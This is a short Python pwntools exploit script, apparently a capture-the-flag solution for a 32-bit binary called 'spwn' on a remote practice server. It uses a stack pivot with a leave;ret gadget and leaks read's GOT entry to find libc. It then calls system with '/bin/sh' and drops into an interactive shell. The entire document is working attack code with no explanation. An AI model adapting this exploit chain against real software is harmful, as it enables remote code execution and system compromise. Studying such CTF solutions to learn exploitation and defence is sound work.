#coding:utf-8
import sys
import base64
from pwn import *
context.log_level='debug'
# while True :
	# try :
if len(sys.argv)==1 :
	io=process('./spwn')
	#io=process(['./pwn'],env={'LD_PRELOAD':'./libc.so.6'})
	elf=ELF('./spwn')
	libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
else :
	io=remote('node3.buuoj.cn',26230)
	elf=ELF('spwn')
	libc=ELF('/home/keer/LibcSearcher-master/libc-database/db/local-19d65d1678e0fa36a3f37f542e1afd31e439f1bd.so')


io.recv()
main_addr=0x08048513
rop_chain=0x0804A300
leave_ret=0x08048408
pay=p32(elf.sym['write'])+p32(main_addr)+p32(1)+p32(elf.got['read'])+p32(8)
io.send(pay)
io.recv()
# gdb.attach(io,'b *0x08048408')
# pause()
io.send('a'*0x18+p32(rop_chain-4)+p32(leave_ret))
libc_base=u32(io.recv()[0:4])-libc.sym['read']
libc.address=libc_base
success('libc_base:'+hex(libc_base))
pay=p32(libc.sym['system'])+p32(main_addr)+p32(libc.search('/bin/sh\x00').next())
io.send(pay)
io.recv()
io.send('a'*0x18+p32(rop_chain-4)+p32(leave_ret))
#sleep(1)
io.interactive()




	# except Exception as e:
	# 	continue
	# else:
	# 	continue